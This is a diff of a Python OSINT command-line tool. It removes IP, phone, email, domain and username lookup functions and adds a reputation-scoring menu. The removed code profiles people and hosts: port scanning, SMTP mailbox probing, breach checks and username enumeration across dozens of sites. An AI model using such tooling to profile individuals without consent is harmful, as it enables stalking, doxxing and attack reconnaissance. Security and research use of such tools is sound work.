-        "AS Name": ip_data.get("connection", {}).get("asn_org", ip_data.get("org", "N/A")),
-        "AS Route": ip_data.get("asn_route", "N/A"),
-        "AS Domain": ip_data.get("asn_domain", "N/A"),
-        "Timezone": ip_data.get("timezone", {}).get("id", ip_data.get("timezone", "N/A")),
-        "Continent": ip_data.get("continent", "N/A"),
-    }
-    
-    for key, value in data.items():
-        if value not in ("N/A", "unknown", None, False, "0"):
-            print(f"{Wh} {key:<14}: {Gr}{value}")
-    
-    lat = data.get("Latitude")
-    lon = data.get("Longitude")
-    if lat != "N/A" and lon != "N/A":
-        print(f"{Wh} Google Maps    : {C}https://www.google.com/maps/@{lat},{lon},15z{RS}")
-        print(f"{Wh} OpenStreetMap  : {C}https://www.openstreetmap.org/?mlat={lat}&mlon={lon}&zoom=15{RS}")
-    
-    print(f"\n{Y}[*] Checking abuse reports...{Wh}")
-    abuse_data = check_ip_abuse(ip)
-    if abuse_data.get("confidence", 0) > 0 or abuse_data.get("reports", 0) > 0:
-        print(f"{R}[!] Abuse Confidence: {abuse_data['confidence']}% | Reports: {abuse_data['reports']}{Wh}")
-        if abuse_data.get("categories"):
-            print(f"{R}    Categories: {', '.join(abuse_data['categories'])}{Wh}")
-    else:
-        print(f"{Gr}[+] No abuse reports found")
-    data["AbuseIPDB"] = abuse_data
-    
-    print(f"\n{Y}[?] Scan common ports? (y/n): {Wh}", end="")
-    if input().lower() == 'y':
-        print(f"{Wh}\n[*] Scanning ports...")
-        ports_result = port_scan(ip)
-        if ports_result:
-            print(f"{Wh}\n[+] Open Ports Found:")
-            service_names = {
-                21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
-                80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB",
-                993: "IMAPS", 995: "POP3S", 3306: "MySQL", 3389: "RDP",
-                5432: "PostgreSQL", 5900: "VNC", 6379: "Redis", 8080: "HTTP-Alt",
-                8443: "HTTPS-Alt", 27017: "MongoDB"
-            }
-            for port, service in sorted(ports_result.items()):
-                srv = service_names.get(port, service)
-                print(f"    {Gr}[+] Port {port:<5} ({srv})")
-            data["open_ports"] = ports_result
-        else:
-            print(f"    {Y}[!] No open ports found (may be firewalled)")
-    
-    result = ScanResult(
-        timestamp=datetime.now().isoformat(),
-        scan_type="ip",
-        target=ip,
-        data=data
-    )
-    save_report(result)
-    input(f"\n{Wh}[+{Wh}] Press Enter to continue")
-
-def phoneGW():
-    print(f"\n {Wh}{'='*50}")
-    print(f" {R}PHONE NUMBER TRACKER")
-    print(f" {Wh}{'='*50}")
-    
-    print(f"{Wh}[?] Enter phone number {Gr}[with country code, e.g., +212612345678]{Wh}")
-    user_input = input(f"\n{Wh}[+] Phone: {Gr}").strip()
-    
-    if user_input.startswith('+'):
-        user_phone = user_input
-    else:
-        for code in sorted(COUNTRY_CODES.keys(), key=len, reverse=True):
-            if user_input.startswith(code):
-                user_phone = f"+{user_input}"
-                break
-        else:
-            user_phone = user_input
-    
-    user_phone = re.sub(r'[^\d+]', '', user_phone)
-    
-    if not validate_phone(user_phone):
-        print(f"{R}[!] Invalid phone number format!")
-        print(f"{Y}[*] Example: +212612345678")
-        input(f"\n{Wh}[+{Wh}] Press Enter to continue")
-        return
-    
-    print(f"\n {Wh}{'='*50}")
-    print(f" {R}PHONE NUMBER INFORMATION")
-    print(f" {Wh}{'='*50}")
-    
-    try:
-        for code in sorted(COUNTRY_CODES.keys(), key=len, reverse=True):
-            if user_phone.startswith(f"+{code}") or user_phone.startswith(code):
-                print(f"{Wh} Country        : {Gr}{COUNTRY_CODES[code]}")
-                print(f"{Wh} Country Code   : {Gr}+{code}")
-                break
-        
-        default_region = "US"
-        parsed_number = phonenumbers.parse(user_phone, default_region)
-        
-        carrier_name = carrier.name_for_number(parsed_number, "en") or "Unknown"
-        carrier_country = geocoder.description_for_number(parsed_number, "en")
-        tzones = ', '.join(phone_timezone.time_zones_for_number(parsed_number))
-        
-        num_type = phonenumbers.number_type(parsed_number)
-        type_map = {
-            phonenumbers.PhoneNumberType.MOBILE: "Mobile",
-            phonenumbers.PhoneNumberType.FIXED_LINE: "Fixed Line",
-            phonenumbers.PhoneNumberType.FIXED_LINE_OR_MOBILE: "Fixed Line/Mobile",
-            phonenumbers.PhoneNumberType.VOIP: "VoIP",
-            phonenumbers.PhoneNumberType.TOLL_FREE: "Toll Free",
-            phonenumbers.PhoneNumberType.PREMIUM_RATE: "Premium Rate",
-            phonenumbers.PhoneNumberType.SHARED_COST: "Shared Cost",
-            phonenumbers.PhoneNumberType.PAGER: "Pager",
-            phonenumbers.PhoneNumberType.UAN: "UAN",
-            phonenumbers.PhoneNumberType.VOICEMAIL: "Voicemail",
-        }
-        num_type_str = type_map.get(num_type, "Other")
-        
-        data = {
-            "Valid Number": phonenumbers.is_valid_number(parsed_number),
-            "Possible Number": phonenumbers.is_possible_number(parsed_number),
-            "Country": carrier_country,
-            "Country Code": f"+{parsed_number.country_code}",
-            "National Number": parsed_number.national_number,
-            "International Format": phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL),
-            "E.164 Format": phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.E164),
-            "National Format": phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.NATIONAL),
-            "RFC3966 Format": phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.RFC3966),
-            "Type": num_type_str,
-            "Carrier": carrier_name,
-            "Timezone": tzones,
-        }
-        
-        is_valid = phonenumbers.is_valid_number(parsed_number)
-        is_possible = phonenumbers.is_possible_number(parsed_number)
-        if is_valid:
-            data["Validity Score"] = "High - Valid Number"
-        elif is_possible:
-            data["Validity Score"] = "Medium - Possible but Invalid"
-        else:
-            data["Validity Score"] = "Low - Impossible Number"
-        
-        for key, value in data.items():
-            if value and value != "Unknown" and value != "Other":
-                print(f"{Wh} {key:<18}: {Gr}{value}")
-        
-        print(f"\n{Gr}[+] Number appears to be a {num_type_str} number in {carrier_country}")
-        
-        clean_number = re.sub(r'[^\d+]', '', user_phone)
-        if not clean_number.startswith('+'):
-            clean_number = '+' + clean_number
-        clean_digits = re.sub(r'\D', '', clean_number)
-        
-        print(f"\n {Wh}{'='*50}")
-        print(f" {R}MESSAGING DIRECT LINKS")
-        print(f" {Wh}{'='*50}")
-        print(f"{Wh} WhatsApp       : {C}https://wa.me/{clean_number}{RS}")
-        print(f"{Wh} Telegram       : {C}https://t.me/{clean_number}{RS}")
-        print(f"{Wh} Signal         : {C}https://signal.me/#p/{clean_number}{RS}")
-        print(f"{Wh} Viber          : {C}viber://chat?number={clean_digits}{RS}")
-        
-        print(f"\n {Wh}{'='*50}")
-        print(f" {R}WEB SEARCH LINKS (open in browser)")
-        print(f" {Wh}{'='*50}")
-        print(f"{Wh} Google Search  : {C}https://www.google.com/search?q={clean_number}{RS}")
-        print(f"{Wh} Truecaller     : {C}https://www.truecaller.com/search/{clean_digits}{RS}")
-        print(f"{Wh} SpyDialer      : {C}https://spydialer.com/default.aspx?search={clean_digits}{RS}")
-        print(f"{Wh} Whitepages     : {C}https://www.whitepages.com/phone/{clean_digits}{RS}")
-        print(f"{Wh} Numcheck       : {C}https://www.numcheck.com/{clean_digits}{RS}")
-        print(f"{Wh} PhoneInfoga    : {C}https://phoneinfoga.crvx.fr/?number={clean_number}{RS}")
-        print(f"{Wh} Sync.Me        : {C}https://sync.me/search/?number={clean_digits}{RS}")
-        print(f"{Wh} FreeCarrierLookup: {C}https://freecarrierlookup.com/getcarrier/{clean_digits}{RS}")
-        
-        result = ScanResult(
-            timestamp=datetime.now().isoformat(),
-            scan_type="phone",
-            target=user_phone,
-            data=data
-        )
-        save_report(result)
-        
-    except phonenumbers.NumberParseException as e:
-        print(f"{R}[!] Error parsing number: {e}")
-    except Exception as e:
-        print(f"{R}[!] Error: {e}")
-    
-    input(f"\n{Wh}[+{Wh}] Press Enter to continue")
-
 def check_email_domain(domain: str) -> Dict:
     info = {}
     try:
@@ -866,176 +1393,6 @@ def check_email_domain(domain: str) -> Dict:
     except:
         pass
     return info
-
-def email_osint():
-    email = input(f"\n{Wh}[?] Enter email address {Gr}[e.g., user@example.com]{Wh}: {Gr}").strip()
-    if not email or '@' not in email:
-        print(f"{R}[!] Invalid email address!")
-        input(f"\n{Wh}[+{Wh}] Press Enter to continue")
-        return
-    
-    print(f"\n {Wh}{'='*50}")
-    print(f" {R}EMAIL OSINT INVESTIGATION")
-    print(f" {Wh}{'='*50}")
-    
-    domain = email.split('@')[1]
-    username = email.split('@')[0]
-    email_hash = hashlib.md5(email.lower().strip().encode()).hexdigest()
-    email_sha1 = hashlib.sha1(email.lower().strip().encode()).hexdigest()
-    
-    data = {
-        "Email": email,
-        "Username": username,
-        "Domain": domain,
-        "MD5 Hash": email_hash,
-        "SHA1 Hash": email_sha1,
-    }
-    
-    print(f"{Wh} Username       : {Gr}{username}")
-    print(f"{Wh} Domain         : {Gr}{domain}")
-    print(f"{Wh} MD5 Hash       : {Gr}{email_hash}")
-    
-    print(f"\n{Y}[*] Checking domain email servers...{Wh}")
-    domain_info = check_email_domain(domain)
-    if domain_info.get("MX Records"):
-        print(f"{Gr}[+] Domain has mail servers configured{Wh}")
-        for mx in domain_info["MX Records"][:3]:
-            print(f"    {Wh}MX: {Gr}{mx}")
-        data["Email Domain Info"] = domain_info
-    elif domain_info.get("A Records"):
-        print(f"{Y}[+] Domain resolves to IP but no MX records{Wh}")
-    else:
-        print(f"{R}[!] Domain does not resolve - email may be invalid{Wh}")
-    
-    print(f"\n{Y}[*] Checking Gravatar...{Wh}")
-    try:
-        gravatar_url = f"https://www.gravatar.com/{email_hash}.json"
-        gravatar_resp = requests.get(gravatar_url, timeout=5)
-        if gravatar_resp.status_code == 200:
-            grav_data = gravatar_resp.json()
-            entries = grav_data.get("entry", [])
-            if entries:
-                profile = entries[0]
-                print(f"{Gr}[+] Gravatar profile found:{Wh}")
-                print(f"    {Wh}Name     : {Gr}{profile.get('displayName', 'N/A')}")
-                print(f"    {Wh}Location : {Gr}{profile.get('currentLocation', 'N/A')}")
-                print(f"    {Wh}Profile  : {C}https://www.gravatar.com/{email_hash}{RS}")
-                data["Gravatar"] = profile
-        else:
-            print(f"{Y}[-] No Gravatar profile found")
-            data["Gravatar"] = None
-    except:
-        print(f"{Y}[?] Could not check Gravatar")
-    
-    print(f"\n{Y}[*] Checking EmailRep.io reputation...{Wh}")
-    try:
-        erep = requests.get(f"https://emailrep.io/{email}", headers={"User-Agent": random.choice(CONFIG["user_agents"])}, timeout=10)
-        if erep.status_code == 200:
-            erep_data = erep.json()
-            rep = erep_data.get("reputation", "unknown")
-            susp = erep_data.get("suspicious", False)
-            data["EmailRep"] = erep_data
-            print(f"{Wh} Reputation    : {Gr}{rep}")
-            print(f"{Wh} Suspicious    : {R}{susp}{Wh}" if susp else f"{Wh} Suspicious    : {Gr}No{Wh}")
-            details = erep_data.get("details", {})
-            if details.get("spam"):
-                print(f"{Wh} Spam Activity : {R}Yes{Wh}")
-            if details.get("malicious_activity"):
-                print(f"{Wh} Malicious     : {R}Yes{Wh}")
-            if details.get("credentials_leaked"):
-                print(f"{Wh} Credentials Leaked: {R}Yes{Wh}")
-            if details.get("data_breach"):
-                print(f"{Wh} Data Breach   : {R}Yes{Wh}")
-            profiles = erep_data.get("details", {}).get("profiles", [])
-            if profiles:
-                print(f"{Wh} Social Profiles: {Gr}{', '.join(profiles[:6])}{Wh}")
-                data["EmailRep Profiles"] = profiles
-        else:
-            print(f"{Y}[-] EmailRep.io check unavailable")
-            data["EmailRep"] = None
-    except:
-        print(f"{Y}[?] Could not check EmailRep.io")
-        data["EmailRep"] = None
-    
-    print(f"\n{Y}[*] Attempting SMTP mailbox verification...{Wh}")
-    try:
-        import smtplib
-        import dns.resolver
-        mx_found = False
-        for mx_rec in domain_info.get("MX Records", []):
-            mx_host = mx_rec.split()[-1] if mx_rec.split() else mx_rec
-            mx_host = mx_host.rstrip('.')
-            try:
-                smtp = smtplib.SMTP(mx_host, 25, timeout=8)
-                smtp.ehlo_or_helo_if_needed()
-                smtp.mail('check@test.com')
-                code, msg = smtp.rcpt(email)
-                smtp.quit()
-                if code == 250:
-                    print(f"{Gr}[+] Email appears valid (server accepted){Wh}")
-                    data["SMTP Status"] = "Valid - Server Accepted"
-                    mx_found = True
-                    break
-                elif code == 450:
-                    print(f"{Y}[?] Email status: Temporary failure (try again){Wh}")
-                    data["SMTP Status"] = "Temporary Failure"
-                    mx_found = True
-                    break
-                elif code == 550:
-                    print(f"{R}[!] Email does not exist on server{Wh}")
-                    data["SMTP Status"] = "Invalid - Rejected by Server"
-                    mx_found = True
-                    break
-            except:
-                continue
-        if not mx_found:
-            print(f"{Y}[?] SMTP verification not possible (no MX or blocked){Wh}")
-            data["SMTP Status"] = "Not Verified"
-    except ImportError:
-        print(f"{Y}[-] SMTP verification requires 'dnspython' package")
-        print(f"{Y}    pip install dnspython")
-        data["SMTP Status"] = "Library Missing"
-    except Exception as e:
-        print(f"{Y}[?] SMTP check skipped: {str(e)[:40]}{Wh}")
-        data["SMTP Status"] = "Check Skipped"
-    
-    print(f"\n{Y}[*] Checking email breach status...{Wh}")
-    breach_data = check_email_breach(email)
-    if breach_data.get("breached") == True:
-        sites = breach_data.get("sites", [])
-        print(f"{R}[!] Email found in {len(sites)} data breaches!{Wh}")
-        data["Breached"] = "Yes"
-        data["Breach Sites"] = [s.get('Name', 'Unknown') for s in sites]
-        for i, site in enumerate(sites[:8], 1):
-            print(f"    {R}{i}. {Y}{site.get('Name', 'Unknown')} ({site.get('Domain', '')})")
-        if len(sites) > 8:
-            print(f"    {Y}... and {len(sites) - 8} more")
-    elif breach_data.get("breached") == False:
-        print(f"{Gr}[+] Email not found in known breaches")
-        data["Breached"] = "No"
-    else:
-        print(f"{Y}[?] Could not check breach status (API limit?)")
-        data["Breached"] = "Unknown"
-    
-    print(f"\n {Wh}{'='*50}")
-    print(f" {R}LOOKUP LINKS (open in browser)")
-    print(f" {Wh}{'='*50}")
-    print(f"{Wh} GitHub search  : {C}https://api.github.com/search/users?q={email}{RS}")
-    print(f"{Wh} Gravatar       : {C}https://www.gravatar.com/{email_hash}{RS}")
-    print(f"{Wh} Hunter.io      : {C}https://hunter.io/search/{domain}{RS}")
-    print(f"{Wh} EmailRep       : {C}https://emailrep.io/{email}{RS}")
-    print(f"{Wh} LeakCheck      : {C}https://leak-check.net/search?query={email}{RS}")
-    print(f"{Wh} DeHashed       : {C}https://dehashed.com/?q={email}{RS}")
-    print(f"{Wh} HaveIBeenPwned : {C}https://haveibeenpwned.com/account/{email}{RS}")
-    
-    result = ScanResult(
-        timestamp=datetime.now().isoformat(),
-        scan_type="email",
-        target=email,
-        data=data
-    )
-    save_report(result)
-    input(f"\n{Wh}[+{Wh}] Press Enter to continue")
 
 def metadata_extractor():
     filepath = input(f"\n{Wh}[?] Enter file path {Gr}[image, PDF, or document]{Wh}: {Gr}").strip()
@@ -1086,175 +1443,83 @@ def metadata_extractor():
     save_report(result)
     input(f"\n{Wh}[+{Wh}] Press Enter to continue")
 
-def domain_osint():
-    domain = input(f"\n{Wh}[?] Enter domain {Gr}[e.g., example.com]{Wh}: {Gr}").strip()
-    if not domain:
-        print(f"{R}[!] Domain cannot be empty!")
-        input(f"\n{Wh}[+{Wh}] Press Enter to continue")
+def reputation_engine_menu():
+    print(f"\n {Wh}{'='*50}")
+    print(f" {R} REPUTATION ENGINE - التهديف الذكي")
+    print(f" {Wh}{'='*50}")
+    print(f"{Wh}[*] يقيم المخاطر من 0-100 بناءً على عوامل متعددة{Wh}")
+    
+    target_type = input(f"\n{Wh}[?] نوع الاستهداف: {Gr}(1) IP  (2) Email  (3) Username{Wh}: {Gr}").strip()
+    target = input(f"{Wh}[?] أدخل القيمة: {Gr}").strip()
+    if not target:
+        print(f"{R}[!] الإدخال فارغ!")
+        input(f"\n{Wh}[+{Wh}] Press Enter")
         return
     
-    domain = domain.lower().replace('https://', '').replace('http://', '').split('/')[0].split('?')[0]
+    engine = ReputationEngine()
+    payload = {'results': {}}
+    
+    if target_type == '1':
+        print(f"{Y}[*] جلب معلومات IP للتحليل...{Wh}")
+        ip_data = get_ip_info(target)
+        ip_reputation = check_ip_reputation_free(target)
+        payload['results'] = {
+            'vpn_proxy': {'is_vpn': ip_reputation.get('is_vpn', False)},
+            'blacklist': ['listed'] if ip_reputation.get('blacklists') else []
+        }
+    elif target_type == '2':
+        print(f"{Y}[*] التحقق من خروقات البريد...{Wh}")
+        breach_data = check_email_breach(target)
+        payload['results'] = {
+            'breaches': breach_data.get('sites', []) if breach_data.get('breached') else []
+        }
+    elif target_type == '3':
+        print(f"{Y}[*] البحث عن username في المنصات...{Wh}")
+        session = get_session()
+        platforms_check = [
+            {"url": "https://www.github.com/{}", "name": "GitHub"},
+            {"url": "https://www.reddit.com/user/{}", "name": "Reddit"},
+        ]
+        platform_results = []
+        for site in platforms_check:
+            try:
+                resp = session.get(site['url'].format(target), timeout=5)
+                body = resp.text[:500].lower() if resp.status_code == 200 else ""
+                patterns = NOT_FOUND_PATTERNS.get(site['name'], [])
+                not_found = any(p in body for p in patterns) if patterns else False
+                platform_results.append({'name': site['name'], 'exists': resp.status_code == 200 and not not_found})
+            except:
+                platform_results.append({'name': site['name'], 'exists': False})
+        payload['results'] = platform_results
+    
+    result = engine.score(payload)
+    
+    risk_colors = {'CRITICAL': R, 'HIGH': Y, 'MEDIUM': Y, 'LOW': Gr}
     
     print(f"\n {Wh}{'='*50}")
-    print(f" {R}DOMAIN OSINT INVESTIGATION")
+    print(f" {R} RESULTAT DU SCORE")
     print(f" {Wh}{'='*50}")
+    print(f"{Wh} Score Final     : {risk_colors.get(result['risk_level'], Wh)}{result['score']}/100{RS}")
+    print(f"{Wh} Risk Level      : {risk_colors.get(result['risk_level'], Wh)}{result['risk_level']}{RS}")
+    if result['factors']:
+        print(f"{Wh} Factors         : {Gr}{', '.join(result['factors'])}{RS}")
     
-    data = {}
+    risk_desc = {
+        'CRITICAL': 'مخاطرة عالية جداً - probablement dangereux',
+        'HIGH': 'مخاطرة عالية - nécessite attention',
+        'MEDIUM': 'مخاطرة متوسطة - peut être suspect',
+        'LOW': 'مخاطرة منخفضة - semble sûr'
+    }
+    print(f"{Wh} Description     : {Y}{risk_desc.get(result['risk_level'], '')}{RS}")
     
-    print(f"{Y}[*] DNS Lookup (A, AAAA records)...{Wh}")
-    dns_data = dns_lookup(domain)
-    data["DNS"] = dns_data
-    ip_addr = dns_data.get('A', 'N/A')
-    print(f"{Wh} IPv4 Address   : {Gr}{ip_addr}")
-    if dns_data.get("All A Records") and len(dns_data["All A Records"]) > 1:
-        print(f"{Wh} All IPs        : {Gr}{', '.join(dns_data['All A Records'])}")
-    
-    print(f"{Y}[*] DNS Records (NS, MX, TXT, SOA)...{Wh}")
-    full_dns = dns_records_full(domain)
-    data["Full DNS"] = full_dns
-    for rtype in ["NS", "MX", "TXT", "SOA"]:
-        records = full_dns.get(rtype, [])
-        if records:
-            print(f"{Wh} {rtype:<14}: {Gr}{records[0][:80]}")
-    
-    print(f"{Y}[*] SSL Certificate Check...{Wh}")
-    ssl_data = check_ssl_cert(domain)
-    data["SSL"] = ssl_data
-    if "error" not in ssl_data:
-        print(f"{Wh} SSL Issuer     : {Gr}{ssl_data.get('Issuer', 'N/A')}")
-        print(f"{Wh} SSL Subject    : {Gr}{ssl_data.get('Subject', 'N/A')}")
-        print(f"{Wh} SSL Expiry     : {Gr}{ssl_data.get('Expiry', 'N/A')}")
-        print(f"{Wh} SSL SAN        : {Gr}{ssl_data.get('SAN', 'N/A')}")
-    else:
-        print(f"{Y}[-] {ssl_data['error']}")
-    
-    print(f"{Y}[*] HTTP Headers & Technology Detection...{Wh}")
-    try:
-        hresp = requests.get(f"https://{domain}", timeout=CONFIG["request_timeout"], 
-                           headers={"User-Agent": random.choice(CONFIG["user_agents"])})
-        headers = dict(hresp.headers)
-        data["HTTP Headers"] = headers
-        server = headers.get("Server", "N/A")
-        if server != "N/A":
-            print(f"{Wh} Server          : {Gr}{server}")
-        powered = headers.get("X-Powered-By", headers.get("X-AspNet-Version", "N/A"))
-        if powered != "N/A":
-            print(f"{Wh} Powered By      : {Gr}{powered}")
-        cdn = headers.get("CF-RAY", headers.get("X-Sucuri-ID", headers.get("x-amz-cf-id", "")))
-        if cdn:
-            print(f"{Wh} WAF/CDN         : {Gr}Cloudflare" if "CF-RAY" in str(headers) else f"{Wh} WAF Detected   : {Gr}Yes")
-        location = headers.get("Location", "")
-        if location:
-            print(f"{Wh} Redirects To    : {Gr}{location}")
-        for tech_header in ["X-Generator", "X-Drupal-Cache", "X-Varnish", "X-Joomla-Version"]:
-            val = headers.get(tech_header, "")
-            if val:
-                print(f"{Wh} {tech_header:<15}: {Gr}{val}")
-        data["HTTP Status"] = hresp.status_code
-    except:
-        print(f"{Y}[-] HTTP check failed (no HTTPS?)")
-        try:
-            hresp = requests.get(f"http://{domain}", timeout=CONFIG["request_timeout"],
-                               headers={"User-Agent": random.choice(CONFIG["user_agents"])})
-            headers = dict(hresp.headers)
-            data["HTTP Headers"] = headers
-            server = headers.get("Server", "N/A")
-            if server != "N/A":
-                print(f"{Wh} Server          : {Gr}{server}")
-            data["HTTP Status"] = hresp.status_code
-        except:
-            print(f"{Y}[-] HTTP check unavailable")
-    
-    print(f"{Y}[*] CRT.sh Certificate Transparency search...{Wh}")
-    try:
-        crt_resp = requests.get(f"https://crt.sh/?q=%.{domain}&output=json", timeout=10)
-        if crt_resp.status_code == 200:
-            certs = crt_resp.json()
-            if isinstance(certs, list) and certs:
-                issuers = set()
-                subdomains = set()
-                for cert in certs[:30]:
-                    name_value = cert.get("name_value", "")
-                    if name_value:
-                        parts = name_value.split("\n")
-                        for p in parts:
-                            subdomains.add(p.lower())
-                    issuer = cert.get("issuer_name", "")
-                    if issuer:
-                        issuers.add(issuer.split("CN=")[-1].split(",")[0] if "CN=" in issuer else issuer[:40])
-                data["CRT.sh Subdomains"] = list(subdomains)[:30]
-                data["CRT.sh Issuers"] = list(issuers)[:5]
-                print(f"{Gr}[+] Found {len(subdomains)} subdomains in cert logs{Wh}")
-                if subdomains:
-                    sub_list = list(subdomains)[:10]
-                    for s in sorted(sub_list):
-                        print(f"    {Wh}- {C}{s}{RS}")
-                    if len(subdomains) > 10:
-                        print(f"    {Y}... and {len(subdomains)-10} more subdomains")
-                if issuers:
-                    print(f"{Wh} Cert Issuers   : {Gr}{', '.join(list(issuers)[:3])}")
-            else:
-                print(f"{Y}[-] No certificates found")
-                data["CRT.sh Subdomains"] = []
-        else:
-            print(f"{Y}[-] CRT.sh unavailable (rate limited)")
-            data["CRT.sh Subdomains"] = []
-    except:
-        print(f"{Y}[-] CRT.sh check failed")
-        data["CRT.sh Subdomains"] = []
-    
-    print(f"{Y}[*] WHOIS Lookup...{Wh}")
-    whois_data = whois_lookup(domain)
-    if "raw" in whois_data:
-        print(f"{Gr}[+] WHOIS data retrieved{Wh}")
-        whois_text = whois_data["raw"][:600]
-        data["WHOIS"] = whois_text
-        registar_match = re.search(r'(Registrar|Sponsoring Registrar):\s*(.+)', whois_text, re.I)
-        if registar_match:
-            print(f"{Wh} Registrar      : {Gr}{registar_match.group(2).strip()[:50]}")
-        date_match = re.search(r'(Creation Date|Created on|created):\s*(.+)', whois_text, re.I)
-        if date_match:
-            print(f"{Wh} Created        : {Gr}{date_match.group(2).strip()[:30]}")
-        expire_match = re.search(r'(Expir\w+ Date|Registry Expiry|paid-till):\s*(.+)', whois_text, re.I)
-        if expire_match:
-            print(f"{Wh} Expires        : {Gr}{expire_match.group(2).strip()[:30]}")
-        org_match = re.search(r'(Registrant Organization|OrgName|org-name):\s*(.+)', whois_text, re.I)
-        if org_match:
-            org_val = org_match.group(2).strip()[:50]
-            if org_val not in ("N/A", "", " REDACTED FOR PRIVACY"):
-                print(f"{Wh} Organization  : {Gr}{org_val}")
-    else:
-        print(f"{Y}[-] WHOIS not available (install whois CLI)")
-    
-    print(f"{Y}[*] Wayback Machine check...{Wh}")
-    wayback_data = wayback_check(domain)
-    if wayback_data.get("available"):
-        print(f"{Gr}[+] Archived version found{Wh}")
-        print(f"{Wh} Archived Date  : {Gr}{wayback_data.get('timestamp')}")
-        print(f"{Wh} Archive URL    : {C}{wayback_data.get('url')}{RS}")
-        data["Wayback"] = wayback_data
-    else:
-        print(f"{Y}[-] No archive found")
-    
-    print(f"\n {Wh}{'='*50}")
-    print(f" {R}ADDITIONAL RESOURCES")
-    print(f" {Wh}{'='*50}")
-    print(f"{Wh} VirusTotal     : {C}https://www.virustotal.com/gui/domain/{domain}{RS}")
-    print(f"{Wh} SecurityTrails  : {C}https://securitytrails.com/domain/{domain}{RS}")
-    print(f"{Wh} URLScan.io     : {C}https://urlscan.io/domain/{domain}{RS}")
-    print(f"{Wh} Shodan         : {C}https://www.shodan.io/domain/{domain}{RS}")
-    print(f"{Wh} CRT.sh (certs) : {C}https://crt.sh/?q=%.{domain}{RS}")
-    print(f"{Wh} BuiltWith      : {C}https://builtwith.com/{domain}{RS}")
-    print(f"{Wh} Wappalyzer     : {C}https://www.wappalyzer.com/lookup/{domain}{RS}")
-    
-    result = ScanResult(
+    scan_result = ScanResult(
         timestamp=datetime.now().isoformat(),
-        scan_type="domain",
-        target=domain,
-        data=data
+        scan_type="reputation",
+        target=target,
+        data={"score": result['score'], "risk_level": result['risk_level'], "factors": result['factors']}
     )
-    save_report(result)
-    input(f"\n{Wh}[+{Wh}] Press Enter to continue")
+    save_report(scan_result)
+    input(f"\n{Wh}[+{Wh}] Press Enter")
 
 def pastebin_osint():
     keyword = input(f"\n{Wh}[?] Enter keyword to search in pastes{Wh}: {Gr}").strip()
@@ -1353,7 +1618,7 @@ def github_osint():
                 extra += f" | Lang: {r['language']}"
             if r.get("forks"):
                 extra += f" | Forks: {r['forks']}"
-            stars = f"★{r['stars']}" if r['stars'] else ""
+            stars = f"{r['stars']}" if r['stars'] else ""
             print(f"    {Wh}- {C}{r['name']:<30}{RS} {Y}{stars}{RS}{extra}")
             if r.get("description"):
                 print(f"      {Wh}{r['description'][:80]}")
@@ -1439,135 +1704,86 @@ def TrackLu():
         print(f"{R}[!] Username cannot be empty!")
         input(f"\n{Wh}[+{Wh}] Press Enter to continue")
         return
-    
-    platforms = [
-        {"url": "https://www.facebook.com/{}", "name": "Facebook"},
-        {"url": "https://x.com/{}", "name": "Twitter/X"},
-        {"url": "https://www.instagram.com/{}", "name": "Instagram"},
-        {"url": "https://www.linkedin.com/in/{}", "name": "LinkedIn"},
-        {"url": "https://www.github.com/{}", "name": "GitHub"},
-        {"url": "https://www.pinterest.com/{}", "name": "Pinterest"},
-        {"url": "https://www.tiktok.com/@{}", "name": "TikTok"},
-        {"url": "https://www.reddit.com/user/{}", "name": "Reddit"},
-        {"url": "https://t.me/{}", "name": "Telegram"},
-        {"url": "https://www.twitch.tv/{}", "name": "Twitch"},
-        {"url": "https://medium.com/@{}", "name": "Medium"},
-        {"url": "https://dev.to/{}", "name": "DevTo"},
-        {"url": "https://hashnode.com/@{}", "name": "Hashnode"},
-        {"url": "https://about.me/{}", "name": "AboutMe"},
-        {"url": "https://www.replit.com/@{}", "name": "Replit"},
-        {"url": "https://codepen.io/{}", "name": "CodePen"},
-        {"url": "https://www.snapchat.com/add/{}", "name": "Snapchat"},
-        {"url": "https://www.youtube.com/@{}", "name": "YouTube"},
-        {"url": "https://open.spotify.com/user/{}", "name": "Spotify"},
-        {"url": "https://www.patreon.com/{}", "name": "Patreon"},
-        {"url": "https://keybase.io/{}", "name": "Keybase"},
-        {"url": "https://www.flickr.com/people/{}", "name": "Flickr"},
-        {"url": "https://dribbble.com/{}", "name": "Dribbble"},
-        {"url": "https://www.behance.net/{}", "name": "Behance"},
-        {"url": "https://mastodon.social/@{}", "name": "Mastodon"},
-        {"url": "https://www.producthunt.com/@{}", "name": "ProductHunt"},
-        {"url": "https://www.buymeacoffee.com/{}", "name": "BuyMeACoffee"},
-        {"url": "https://www.threads.net/@{}", "name": "Threads"},
-        {"url": "https://discord.com/users/{}", "name": "Discord"},
-        {"url": "https://steamcommunity.com/id/{}", "name": "Steam"},
-        {"url": "https://soundcloud.com/{}", "name": "SoundCloud"},
-        {"url": "https://www.wattpad.com/user/{}", "name": "Wattpad"},
-        {"url": "https://vk.com/{}", "name": "VK"},
-        {"url": "https://www.mixcloud.com/{}/", "name": "Mixcloud"},
-        {"url": "https://tryhackme.com/p/{}", "name": "TryHackMe"},
-        {"url": "https://news.ycombinator.com/user?id={}", "name": "HackerNews"},
-        {"url": "https://gitlab.com/{}", "name": "GitLab"},
-        {"url": "https://bitbucket.org/{}/", "name": "Bitbucket"},
-        {"url": "https://angel.co/u/{}", "name": "AngelList"},
-        {"url": "https://www.quora.com/profile/{}", "name": "Quora"},
-        {"url": "https://www.codecademy.com/profiles/{}", "name": "Codecademy"},
-        {"url": "https://www.youracclaim.com/users/{}", "name": "Acclaim"},
-        {"url": "https://www.codewars.com/users/{}", "name": "CodeWars"},
-        {"url": "https://www.hackerrank.com/{}", "name": "HackerRank"},
-        {"url": "https://www.couchsurfing.com/people/{}", "name": "Couchsurfing"},
-        {"url": "https://cash.app/{}", "name": "CashApp"},
-        {"url": "https://venmo.com/{}", "name": "Venmo"},
-        {"url": "https://imgur.com/user/{}", "name": "Imgur"},
-        {"url": "https://letterboxd.com/{}/", "name": "Letterboxd"},
-    ]
-    
+
     print(f"\n {Wh}{'='*50}")
-    print(f" {R}USERNAME TRACKING")
+    print(f" {R}USERNAME TRACKER - SUPER ENGINE")
     print(f" {Wh}{'='*50}")
